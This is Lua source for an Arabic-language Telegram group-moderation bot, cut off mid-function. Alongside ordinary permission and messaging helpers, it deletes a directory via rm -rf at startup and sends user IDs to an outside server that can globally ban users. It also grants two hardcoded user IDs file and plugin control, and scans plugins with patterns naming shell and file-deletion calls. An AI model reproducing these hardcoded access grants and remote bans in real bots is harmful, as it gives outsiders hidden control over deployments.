--[[
 ____        _      _
/ ___| _ __ (_) ___| |__  _ __
\___ \| '_ \| |/ _ \ '_ \| '__|
 ___) | | | | |  __/ |_) | |
|____/|_| |_|_|\___|_.__/|_|
           CH > @SNIEBRTEAM
--]]
--------------------------------------
serpent = require('serpent')
serp = require 'serpent'.block
https = require("ssl.https")
HTTPS = require("ssl.https")
http = require("socket.http")
http.TIMEOUT = 10
lgi = require ('lgi')
bot=dofile('./libs/utils.lua')
JSON = (loadfile  "./libs/dkjson.lua")()
json = dofile("./libs/JSON.lua")
redis = (loadfile "./libs/redis.lua")()
datahmade = Redis.connect('127.0.0.1', 6379)
notify = lgi.require('Notify')
notify.init ("Telegram updates")
sudos = dofile('sudo.lua')
chats = {}
day = 86400
bot_idkeko = {string.match(token, "^(%d+)(:)(.*)")}
bot_id = tonumber(bot_idkeko[1])
sudo_users = {sudo_add,bot_id}
URL33 = require('socket.url')
tdcli=dofile('./libs/utils.lua')
---------- {Show Files} -----------
red = '\27[31m' reset = '\27[m' Blue = "\27[34m" Green = "\27[32m"
local files_SNIEBR = datahmade:smembers("files"..bot_id) 
print(Green.."\nFiles Now Started : \n "..reset)
for i,v in pairs(files_SNIEBR) do
print(Blue..i..red..' - \27[10;33m'..v..',\27[m')  end
print(Green.."\nThes all Files.\n\n\n"..reset)
io.popen("mkdir files_SNIEBR")
os.execute('cd .. &&  rm -rf .telegram-cli')
os.execute('cd .. &&  rm -fr .telegram-cli')
--         »»                 Start Functions                         ««              --
--         »»                 is_sudo                         ««              --
function is_sudo(msg)
local var = false
for k,v in pairs(sudo_users) do
if msg.sender_user_id_ == v then var = true end
end
local keko_add_sudo = redis:get('SNIEBR:'..bot_id..'sudoo'..msg.sender_user_id_..'')
if keko_add_sudo then var = true end return var
end
--         »»                 is_admin                         ««              --
function is_admin(msg)
user_id = msg.sender_user_id_
local var = false 
local admin = datahmade:sismember('SNIEBR:'..bot_id..'admins:', user_id)
if admin then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then var = true end
end
local keko_add_sudo = redis:get('SNIEBR:'..bot_id..'sudoo'..user_id..'')
if keko_add_sudo then var = true end
return var
end
--         »»                 is_admin                         ««              --
function ck_admin(user_id)
local var = false 
local admin = datahmade:sismember('SNIEBR:'..bot_id..'admins:', user_id)
if admin then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then var = true end
end
local keko_add_sudo = redis:get('SNIEBR:'..bot_id..'sudoo'..user_id..'')
if keko_add_sudo then var = true end
return var
end
--         »»                 is_creator                         ««              --

function is_creatorbasic(msg)
user_id = msg.sender_user_id_
chat_id = msg.chat_id_
local var = false
local creatorbasic = datahmade:sismember('SNIEBR:'..bot_id..'creatorbasic:'..chat_id, user_id) 
local admin = datahmade:sismember('SNIEBR:'..bot_id..'admins:', user_id)
if creatorbasic then 
var = true 
end
if admin then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then var = true end end
local keko_add_sudo = redis:get('SNIEBR:'..bot_id..'sudoo'..user_id..'')
if keko_add_sudo then var = true end
return var
end
function is_creatorbasicid(user_id,chat_id)
local var = false
local creatorbasic = datahmade:sismember('SNIEBR:'..bot_id..'creatorbasic:'..chat_id, user_id) 
local admin = datahmade:sismember('SNIEBR:'..bot_id..'admins:', user_id)
if creatorbasic then 
var = true 
end
if admin then var = true end
return var
end

function is_creator(msg)
user_id = msg.sender_user_id_
chat_id = msg.chat_id_
local var = false
local creatorbasic = datahmade:sismember('SNIEBR:'..bot_id..'creatorbasic:'..chat_id, user_id) 
local creator = datahmade:sismember('SNIEBR:'..bot_id..'creator:'..chat_id, user_id) 
local admin = datahmade:sismember('SNIEBR:'..bot_id..'admins:', user_id)
if creatorbasic then var = true end
if creator then var = true end
if admin then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then var = true end end
local keko_add_sudo = redis:get('SNIEBR:'..bot_id..'sudoo'..user_id..'')
if keko_add_sudo then var = true end
return var
end
--         »»                 is_vip                         ««              --
function is_vip(msg)
user_id = msg.sender_user_id_
chat_id = msg.chat_id_
local var = false
local mod = datahmade:sismember('SNIEBR:'..bot_id..'mods:'..chat_id, user_id)  
local admin = datahmade:sismember('SNIEBR:'..bot_id..'admins:', user_id)  
local owner = datahmade:sismember('SNIEBR:'..bot_id..'owners:'..chat_id, user_id)
local creator = datahmade:sismember('SNIEBR:'..bot_id..'creator:'..chat_id, user_id)  
local creatorbasic = datahmade:sismember('SNIEBR:'..bot_id..'creatorbasic:'..chat_id, user_id)  
local vip = datahmade:sismember('SNIEBR:'..bot_id..'vipgp:'..chat_id, user_id)
if mod then var = true end
if owner then var = true end
if creator then var = true end
if creatorbasic then var = true end
if admin then var = true end
if vip then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true end end
local keko_add_sudo = redis:get('SNIEBR:'..bot_id..'sudoo'..user_id..'')
if keko_add_sudo then var = true end
return var end
o023121 = true
--         »»                 is_owner                         ««              --
function is_owner(msg)
user_id = msg.sender_user_id_
chat_id = msg.chat_id_
local var = false
local admin = datahmade:sismember('SNIEBR:'..bot_id..'admins:', user_id)  
local owner = datahmade:sismember('SNIEBR:'..bot_id..'owners:'..chat_id, user_id)
local creator = datahmade:sismember('SNIEBR:'..bot_id..'creator:'..chat_id, user_id)  
local creatorbasic = datahmade:sismember('SNIEBR:'..bot_id..'creatorbasic:'..chat_id, user_id) 
if owner then var = true end 
if admin then var = true end
if creator then var = true end
if creatorbasic then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
local keko_add_sudo = redis:get('SNIEBR:'..bot_id..'sudoo'..user_id..'')
if keko_add_sudo then var = true end
return var
end
--         »»                 is_mod                         ««              --
function is_setban(msg)
user_id = msg.sender_user_id_
chat_id = msg.chat_id_
local var = false
local mod = datahmade:sismember('SNIEBR:'..bot_id..'SET:BAN'..chat_id, user_id)  
local creator = datahmade:sismember('SNIEBR:'..bot_id..'creator:'..chat_id, user_id)  
if mod then var = true end
if owner then var = true end
if creator then var = true end
if admin then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then var = true end end
local keko_add_sudo = redis:get('SNIEBR:'..bot_id..'sudoo'..user_id..'')
if keko_add_sudo then var = true end
return var
end
function is_mod(msg)
user_id = msg.sender_user_id_
chat_id = msg.chat_id_
local var = false
local mod = datahmade:sismember('SNIEBR:'..bot_id..'mods:'..chat_id, user_id)  
local admin = datahmade:sismember('SNIEBR:'..bot_id..'admins:', user_id)  
local owner = datahmade:sismember('SNIEBR:'..bot_id..'owners:'..chat_id, user_id)
local creator = datahmade:sismember('SNIEBR:'..bot_id..'creator:'..chat_id, user_id)  
local creatorbasic = datahmade:sismember('SNIEBR:'..bot_id..'creatorbasic:'..chat_id, user_id)  
if mod then var = true end
if owner then var = true end
if creator then var = true end
if creatorbasic then var = true end
if admin then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then var = true end end
local keko_add_sudo = redis:get('SNIEBR:'..bot_id..'sudoo'..user_id..'')
if keko_add_sudo then var = true end
return var
end
--         »»                 ck_mod                         ««              --
function ck_mod(user_id,chat_id)
local var = false
local mod = datahmade:sismember('SNIEBR:'..bot_id..'mods:'..chat_id, user_id)  
local admin = datahmade:sismember('SNIEBR:'..bot_id..'admins:', user_id)  
local owner = datahmade:sismember('SNIEBR:'..bot_id..'owners:'..chat_id, user_id)
local creatorbasic = datahmade:sismember('SNIEBR:'..bot_id..'creatorbasic:'..chat_id, user_id)  
local creator = datahmade:sismember('SNIEBR:'..bot_id..'creator:'..chat_id, user_id)  
local vip = datahmade:sismember('SNIEBR:'..bot_id..'vipgp:'..chat_id, user_id)
if mod then var = true end
if owner then var = true end
if creatorbasic then var = true end
if creator then var = true end
if admin then var = true end
if vip then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then var = true end end
local keko_add_sudo = redis:get('SNIEBR:'..bot_id..'sudoo'..user_id..'')
if keko_add_sudo then var = true end
return var
end
--         »»                 is_banned                         ««              --
function is_banned(user_id, chat_id)
local var = false
local banned = datahmade:sismember('SNIEBR:'..bot_id..'banned:'..chat_id, user_id)
if banned then var = true end
return var
end
--         »»                 is_gbanned                         ««              --
function is_gbanned(user_id)
local var = false
local banned = datahmade:sismember('SNIEBR:'..bot_id..'gbanned:', user_id)
if banned then var = true end
return var
end
--         »»                 is_muted                         ««              --
function is_muted(user_id, chat_id)
local var = false
local banned = datahmade:sismember('SNIEBR:'..bot_id..'muted:'..chat_id, user_id)
if banned then var = true end
return var
end
--         »»                 is_gmuted                         ««              --
function is_gmuted(user_id)
local var = false 
local banned = datahmade:sismember('SNIEBR:'..bot_id..'gmuted:', user_id)
if banned then var = true end
return var
end
end032 = o023121 or true
--         »»                 getMessage                         ««              --
local function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
k2342 = io.open("SNIEBR.lua")
--         »»                 check_filter_words                         ««              --
local function check_filter_words(msg, value)
local hash =  'SNIEBR:'..bot_id..'filters:'..msg.chat_id_
if hash then
local names = datahmade:hkeys(hash)
local text = ''
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not is_vip(msg)then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
end
end
end
local function openChat(chat_id,dl_cb)
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
}, dl_cb, nil)
end
--         »»                 resolve_username                         ««              --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--         »»                 changeChatMemberStatus                         ««              --
function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat_id,
user_id_ = user_id,
status_ = {
ID = "ChatMemberStatus" .. status
},
}, dl_cb, nil)
end
--         »»                 getInputFile                         ««              --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--         »»                 del_all_msgs                         ««              --
function del_all_msgs(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
--         »»                 deleteMessagesFromUser                         ««              --
local function deleteMessagesFromUser(chat_id, user_id, cb, cmd)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
},cb or dl_cb, cmd)
end
--         »»                 getChatId                         ««              --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--         »»                 chat_leave                         ««              --
function chat_leave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end
--         »»                 from_username                         ««              --
function from_username(msg)
function gfrom_user(extra,result,success)
if result.username_ then
F = result.username_
else F = 'nil' end
return F
end
local username = getUser(msg.sender_user_id_,gfrom_user)
return username
end
--         »»                 chat_kick                         ««              --
function chat_kick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end
--         »»                 do_notify                         ««              --
function do_notify (user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end
--         »»                 getParseMode                         ««              --
local function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end end return P
end
--         »»                 getMessage                         ««              --
local function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--         »»                 sendContact                         ««              --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageContact",
contact_ = {
ID = "Contact",
phone_number_ = phone_number,
first_name_ = first_name,
last_name_ = last_name,
user_id_ = user_id
},},}, dl_cb, nil)
end
--         »»                 sendPhoto                         ««              --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessagePhoto",
photo_ = getInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption
},}, dl_cb, nil)
end
--         »»                 getUserFull                         ««              --
function getUserFull(user_id,cb)
tdcli_function ({
ID = "GetUserFull",
user_id_ = user_id
}, cb, nil)
end
--         »»                 vardump                         ««              --
local function sendtext(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end

function vardump(value)
print(serpent.block(value, {comment=false}))
end
--         »»                 dl_cb                         ««              --
function dl_cb(arg, data)
end
--         »»                 send                         ««              --
local function send(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
if text then 

local TextParseMode = getParseMode(parse_mode)
local text2 = text
local text_key = datahmade:get('key_ts'..bot_id)
if text_key then
if parse_mode then
if parse_mode == 'markdown' or parse_mode == 'md' then
parse_mode = "Markdown"
elseif parse_mode == 'html' then
parse_mode = "Html"
end
end
local channel_ts = datahmade:get("channel_ts"..bot_id)
local channel_user_ts = datahmade:get("channel_user_ts"..bot_id)
keyboard = {}
keyboard.inline_keyboard = {
{
{text = ''..(channel_ts or "SNIEBR TEAM")..'', url=''..(channel_user_ts or 't.me/SNIEBR_files')..''},
},
}
local keko = "https://api.telegram.org/bot" ..token.. '/sendMessage?chat_id=' .. chat_id
if reply_to_message_id ~= 0 then
keko = keko .. '&reply_to_message_id=' .. reply_to_message_id/2097152/0.5 -- جميع الحقوق محفوظه لفريق سنايبر لايمكنك نسخ او استخدام هذه السطر بدون موافقه الفريق
end
if disable_web_page_preview then
keko = keko .. '&disable_web_page_preview=true'
end
if text then
keko = keko..'&text='..URL33.escape(text2)
end
if parse_mode then
keko = keko .. '&parse_mode='..parse_mode
end
keko = keko..'&reply_markup='..JSON.encode(keyboard)
https.request(keko)
else
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},}, dl_cb, nil)
end
end
end
local function SendText(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
--         »»                 changetitle                         ««              --
function changetitle(chat_id, title)
tdcli_function ({
ID = "ChangeChatTitle",
chat_id_ = chat_id,
title_ = title
}, dl_cb, nil)
end
--         »»                 edit                         ««              --
function edit(chat_id, message_id, reply_markup, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "EditMessageText",
chat_id_ = chat_id,
message_id_ = message_id,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
--         »»                 setphoto                         ««              --
function setphoto(chat_id, photo)
tdcli_function ({
ID = "ChangeChatPhoto",
chat_id_ = chat_id,
photo_ = getInputFile(photo)
}, dl_cb, nil)
end
--         »»                 add_user                         ««              --
function add_user(chat_id, user_id, forward_limit)
tdcli_function ({
ID = "AddChatMember",
chat_id_ = chat_id,
user_id_ = user_id,
forward_limit_ = forward_limit or 50
}, dl_cb, nil)
end
--         »»                 delmsg                         ««              --
function delmsg(arg,data)
for k,v in pairs(data.messages_) do
delete_msg(v.chat_id_,{[0] = v.id_})
end
end
--         »»                 unpinmsg                         ««              --
function unpinmsg(channel_id)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
--         »»                 delete_msg                         ««              --
function delete_msg(chatid,mid)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chatid,
message_ids_=mid
},
dl_cb, nil)
end
--         »»                 chat_del_user                         ««              --
function chat_del_user(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, 'Editor')
end
--         »»                 getChannelMembers                         ««              --
function getChannelMembers(channel_id, offset, filter, limit)
if not limit or limit > 200 then
limit = 200
end
tdcli_function ({
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {
ID = "ChannelMembers" .. filter
},
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
--         »»                 getChannelFull                         ««              --
function getChannelFull(channel_id)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
--         »»                 channel_get_bots                         ««              --
local o0321 = o023121
local function channel_get_bots(channel,cb)
local function callback_admins(extra,result,success)
limit = result.member_count_
getChannelMembers(channel, 0, 'Bots', limit,cb)
channel_get_bots(channel,get_bots)
end
getChannelFull(channel,callback_admins)
end
--         »»                 getInputMessageContent                         ««              --
local function getInputMessageContent(file, filetype, caption)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
local inmsg = {}
local filetype = filetype:lower()
if filetype == 'animation' then
inmsg = {ID = "InputMessageAnimation", animation_ = infile, caption_ = caption}
elseif filetype == 'audio' then
inmsg = {ID = "InputMessageAudio", audio_ = infile, caption_ = caption}
elseif filetype == 'document' then
inmsg = {ID = "InputMessageDocument", document_ = infile, caption_ = caption}
elseif filetype == 'photo' then
inmsg = {ID = "InputMessagePhoto", photo_ = infile, caption_ = caption}
elseif filetype == 'sticker' then
inmsg = {ID = "InputMessageSticker", sticker_ = infile, caption_ = caption}
elseif filetype == 'video' then
inmsg = {ID = "InputMessageVideo", video_ = infile, caption_ = caption}
elseif filetype == 'voice' then
inmsg = {ID = "InputMessageVoice", voice_ = infile, caption_ = caption}
end
return inmsg
end
--         »»                 send_file                         ««              --
function send_file(chat_id, type, file, caption,wtf)
local mame = (wtf or 0)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = mame,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = getInputMessageContent(file, type, caption),
}, dl_cb, nil)
end
--         »»                 getUser                         ««              --
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
--         »»                 pin                         ««              --
function pin(channel_id, message_id, disable_notification)
tdcli_function ({
ID = "PinChannelMessage",
channel_id_ = getChatId(channel_id).ID,
message_id_ = message_id,
disable_notification_ = disable_notification
}, dl_cb, nil)
end
--         »»                 tsX000                         ««              --
function tsX000(value,msg,text)
if value == "lock" then
function keko333(extra,result,success)
if result.first_name_ then
if #result.first_name_ < 15 then 
else
for SNIEBR_one in string.gmatch(result.first_name_, "[^%s]+") do
result.first_name_ = SNIEBR_one
break
end
end
end 
info = '👤┇بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'SNIEBR')..')\n'..text
send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
end
getUser(msg.sender_user_id_, keko333)
end
if value == "prore" then
function get_SNIEBR(SNIEBR1,SNIEBR2,SNIEBR3)
local id_SNIEBR = SNIEBR2.sender_user_id_
function keko333(extra,result,success)
if result.first_name_ then
if #result.first_name_ < 15 then 
else
for SNIEBR_one in string.gmatch(result.first_name_, "[^%s]+") do
result.first_name_ = SNIEBR_one
break
end
end
end 
info = '👤┇العضو ~⪼ ['..result.first_name_..'](t.me/'..(result.username_ or 'SNIEBR')..')\n'..text
send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
end
getUser(id_SNIEBR, keko333)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,get_SNIEBR)
end
if value ~= "prore" and value~= "lock"  then
function keko333(extra,result,success)
if result.first_name_ then
if #result.first_name_ < 15 then 
else
for SNIEBR_one in string.gmatch(result.first_name_, "[^%s]+") do
result.first_name_ = SNIEBR_one
break
end
end
end 
info = '👤┇العضو ~⪼ ['..(result.first_name_ or value)..'](t.me/'..(result.username_ or 'SNIEBR')..')\n'..text
send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
end
getUser(value, keko333)
end
end -- end fun
function Get_Info(msg,chat,user) --// ارسال نتيجة الصلاحيه
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user..'')
local Json_Info = JSON.decode(Chek_Info)
vardump(Json_Info)
if Json_Info.ok == true then
if Json_Info.result.status == "creator" then
SendText(msg.chat_id_,msg.id_,'\n🚸┇ صلاحياته منشئ الكروب 🍃')   
return false  end 
if Json_Info.result.status == "member" then
SendText(msg.chat_id_,msg.id_,'\n🚸┇ مجرد عضو هنا 🍃')   
return false  end
if Json_Info.result.status == 'left' then
SendText(msg.chat_id_,msg.id_,'\n🚸┇ الشخص غير موجود هنا 🍃')   
return false  end
if Json_Info.result.status == "administrator" then
if Json_Info.result.can_change_info == true then
info = ' ✓'
else
info = '✘'
end
if Json_Info.result.can_delete_messages == true then
delete = ' ✓'
else
delete = '✘'
end
if Json_Info.result.can_invite_users == true then
invite = ' ✓'
else
invite = '✘'
end
if Json_Info.result.can_pin_messages == true then
pin = ' ✓'
else
pin = '✘'
end
if Json_Info.result.can_restrict_members == true then
restrict = ' ✓'
else
restrict = '✘'
end
if Json_Info.result.can_promote_members == true then
promote = ' ✓'
else
promote = '✘'
end
SendText(chat,msg.id_,'\n📌┇ الرتبة : مشرف 🍃 '..'\n💢┇ والصلاحيات هي ↓ \nٴ━━━━━━━━━━'..'\n📋┇ تغير معلومات المجموعه ↞ ❴ '..info..' ❵'..'\n📨┇ حذف الرسائل ↞ ❴ '..delete..' ❵'..'\n🚷┇ حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n♻┇ دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n🔘┇ تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n🚸┇ اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
--         »»                 End Functions                         ««              --
function TSadd(msg) -- Function add && rem
local text = msg.content_.text_
if (text == 'تعطيل') and not is_sudo(msg) then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
function TSby(extra,result,success)
info = '👤┇بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'SNIEBR')..')\n'
local keko2 = datahmade:get("add"..bot_id)
if keko2 then
local keko = "https://api.telegram.org/bot" ..token.. '/getChatMember?chat_id=' .. msg.chat_id_ .. '&user_id='..msg.sender_user_id_
local stats = https.request(keko)
local data = json:decode(stats)
if (data.result and data.result.status == 'creator') then
if not datahmade:get( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_) then
function thsake_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, "❕┇المجموعه {"..(k2.title_ or "").."} معطله سابقا", 1, 'md')
end
openChat(msg.chat_id_,thsake_info)
end
if datahmade:get( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_) then
datahmade:del( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_)
function thsake_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, info.."☑️┇تم تعطيل المجموعه {"..k2.title_.."}", 1, 'md')
end
openChat(msg.chat_id_,thsake_info)
datahmade:srem("thsake:gog"..bot_id, msg.chat_id_)
datahmade:del('SNIEBR:'..bot_id.."charge:"..msg.chat_id_)
function thsake_info2(k1,k2)
function dl_cb222(t1,t2)
send(tostring((datahmade:get("SNIEBR"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام بتعطيل مجموعه \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,thsake_info2) 
--
end
else
send(msg.chat_id_, msg.id_, 1, "⚠️┇انت لست (منشئ او مدير) في المجموعة", 1, 'md')
end
end
end
getUser(msg.sender_user_id_, TSby)
end
-- end function
if  msg.sender_user_id_ == 438898779 or msg.sender_user_id_ == 352111144 then
if (msg.content_.text_ == 'الملفات' ) then
local files_SNIEBR = datahmade:smembers("files"..bot_id)
local keko = io.popen('cd files_SNIEBR && ls'):read("*all")
local files_SNIEBR2 = ''
for i=1,#files_SNIEBR do
files_SNIEBR2 = files_SNIEBR2..'{'..files_SNIEBR[i]..'}\n'
end
send(msg.chat_id_, msg.id_, 1, '☑┇جميع الملفات : \n '..keko..'\n ---------------------- \n\n✔┇الملفات المفعله \n'..files_SNIEBR2..'', 1, 'html')
end
text = msg.content_.text_
if text then
if text:match("^(تفعيل ملف) (.*)(.lua)$")then
local name_t = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
function load(filename)
local f = io.open(filename)
if not f then
return "keko"
end
local s = f:read('*all')
f:close()
return s
end
local f = load("files_SNIEBR/"..name_t[2]..".lua")
if f ~= "keko" then
ts23 = ""
if f:match("^(.*)(keko_SNIEBR)(.*)$") then
if f:match("^(.*)(function send)(.*)$") then
ts23 = ts23 .. "\n⚠┇ارسال رسال نصيه"
end
if (f:match("^(.*)(sudo.lua)(.*)$")) then 
ts23 = ts23 .. "\n⚠┇الوصول الى توكن البوت وايدي المطور الاساسي"
end
if (f:match("^(.*)(io.popen)(.*)$")) then 
ts23 = ts23 .. "\n⚠┇الوصول الى تورمنل البوت"
end
if (f:match("^(.*)(os.execute)(.*)$")) then 
ts23 = ts23 .. "\n⚠┇الوصول الى تورمنل البوت"
end
if (f:match("^(.*)(redis)(.*)$")) then 
ts23 = ts23 .. "\n⚠┇الوصول الى خزن البوت"
end
if (f:match("^(.*)(ssl.https)(.*)$")) then 
ts23 = ts23 .. "\n⚠┇الوصول الى مواقع خارجيه في البوت"
end
if (f:match("^(.*)(rm -fr)(.*)$")) then 
ts23 = ts23 .. "\n⚠┇حذف ملفات او مجلدات"
end
if (f:match("^(.*)(encode)(.*)$")) then 
ts23 = ts23 .. "\n⚠┇التصال بapi خارجي"
end
if (f:match("^(.*)(api.telegram.org/bot)(.*)$")) then 
ts23 = ts23 .. "\n⚠┇قد يسبب الضعف في البوت"
end
datahmade:sadd("files"..bot_id,name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, "✔┇تم تفعيل {"..name_t[2]..".lua}\n"..ts23, 1, 'html')
else
send(msg.chat_id_, msg.id_, 1, '⚠┇عذرا لا يمكن تشغيل {'..name_t[2]..'.lua} \n❗┇لانه لا يدعم سورس سنايبر \n 🦁┇[ملفات يدعمها سورس سنايبر](t.me/SNIEBR_files)', 1, 'md')
end
else
send(msg.chat_id_, msg.id_, 1, '⚠┇عذرا لا يمكن تشغيل {'..name_t[2]..'.lua} \n❗┇لانه لا يدعم سورس سنايبر \n 🦁┇[ملفات يدعمها سورس سنايبر](t.me/SNIEBR_files)', 1, 'md')
end
end
if text:match("^(تعطيل ملف) (.*)(.lua)$") then
local name_t = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, "✖┇تم تعطيل {"..name_t[2]..".lua}", 1, 'html')
end
if (text:match("^(مسح جميع الملفات)$"))then
datahmade:del("files"..bot_id)
send(msg.chat_id_, msg.id_, 1, "🗑┇تم حذف جميع الملفات", 1, 'html')
end
if text:match("^(حذف ملف) (.*)(.lua)$") then
local name_t = {string.match(text, "^(حذف ملف) (.*)(.lua)$")}
